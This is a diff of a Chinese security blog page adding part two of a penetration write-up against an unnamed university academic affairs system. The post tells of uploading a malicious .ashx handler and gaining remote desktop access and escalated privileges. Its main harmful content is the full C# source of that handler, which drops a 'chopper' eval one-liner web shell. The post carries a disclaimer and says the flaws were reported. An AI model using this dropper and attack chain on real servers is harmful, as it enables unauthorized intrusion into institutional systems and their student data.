@@ -6,15 +6,44 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://y00z.github.io">
-  <title>标签 | Yooz的博客</title>
+  <title>某教务系统注入getshell提权一条龙(下) | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://y00z.github.io/tags/index.html">
+  <meta name="description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某教务系统注入getshell提权一条龙(下)">
+<meta property="og:url" content="http://y00z.github.io/2017/03/14/某教务系统注入getshell提权一条龙-下/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:updated_time" content="2016-12-14T02:11:41.380Z">
+<meta property="og:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-53.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-53.5.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-54.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-55.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-56.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-57.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-58.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-59.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-60.PNG">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-61.PNG">
+<meta property="og:updated_time" content="2017-04-02T07:46:48.734Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="某教务系统注入getshell提权一条龙(下)">
+<meta name="twitter:description" content="前言
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
+
+
+正文
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta name="twitter:image" content="http://y00z.github.io/images/pasted-53.PNG">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
@@ -144,27 +173,71 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-undefined" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-某教务系统注入getshell提权一条龙-下" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      标签
+      某教务系统注入getshell提权一条龙(下)
     </h1>
   
 
         
-        <a href="/tags/index.html" class="archive-article-date">
-  	<time datetime="2016-12-14T02:05:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-14</time>
+        <a href="/2017/03/14/某教务系统注入getshell提权一条龙-下/" class="archive-article-date">
+  	<time datetime="2017-03-14T03:14:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
+
+</blockquote>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。<a id="more"></a></p>
+</blockquote>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><blockquote>
+<p>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传</p>
+</blockquote>
+<p><img src="/images/pasted-53.PNG" alt=""></p>
+<p><img src="/images/pasted-53.5.PNG" alt=""></p>
+<blockquote>
+<p>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话</p>
+</blockquote>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; </div><div class="line">using System; </div><div class="line">using System.Web; </div><div class="line">using System.IO; </div><div class="line">public class Handler : IHttpHandler &#123; </div><div class="line">    public void ProcessRequest (HttpContext context) &#123; </div><div class="line">        context.Response.ContentType = &quot;text/plain&quot;; </div><div class="line">        string show=&quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;; </div><div class="line">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); </div><div class="line">        file1.Write(show); </div><div class="line">        file1.Flush(); </div><div class="line">        file1.Close(); </div><div class="line">    &#125; </div><div class="line">    public bool IsReusable &#123; </div><div class="line">        get &#123; </div><div class="line">            return false; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>会上传在wbwj目录下</p>
+<p>访问<a href="http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码" target="_blank" rel="external">http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码</a> chopper</p>
+<p>一句话地址，<a href="http://***.***.com/wbwj/root.aspx" target="_blank" rel="external">http://***.***.com/wbwj/root.aspx</a>  连接之</p>
+</blockquote>
+<p><img src="/images/pasted-54.PNG" alt=""></p>
+<blockquote>
+<p>看下权限,还是挺大的，</p>
+</blockquote>
+<p><img src="/images/pasted-55.PNG" alt=""></p>
+<p><img src="/images/pasted-56.PNG" alt=""></p>
+<p><img src="/images/pasted-57.PNG" alt=""></p>
+<blockquote>
+<p>直接上传神器提权之。</p>
+</blockquote>
+<p><img src="/images/pasted-58.PNG" alt=""></p>
+<blockquote>
+<p>3389端口没有改，直接连接。</p>
+</blockquote>
+<p><img src="/images/pasted-59.PNG" alt=""></p>
+<p><img src="/images/pasted-60.PNG" alt=""></p>
+<blockquote>
+<p>在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。</p>
+</blockquote>
+<p><img src="/images/pasted-61.PNG" alt=""></p>
+<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><blockquote>
+<p>这个是什么教务系统就不多说，用过的一看就知道。<br>有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。<br>后期还会写更多的渗透文章，漫游学校内网，更改led大屏幕，免费上网等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>
+</blockquote>
+
       
 
       
@@ -203,6 +276,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -253,7 +337,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/tags/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://y00z.github.io/2017/03/14/某教务系统注入getshell提权一条龙-下/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -265,6 +349,25 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2017/03/17/adb指令渗透手机获取隐私信息/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          adb指令渗透手机获取隐私信息
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/14/某教务系统注入getshell提权一条龙-上/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">某教务系统注入getshell提权一条龙(上)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 
 
@@ -297,7 +400,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
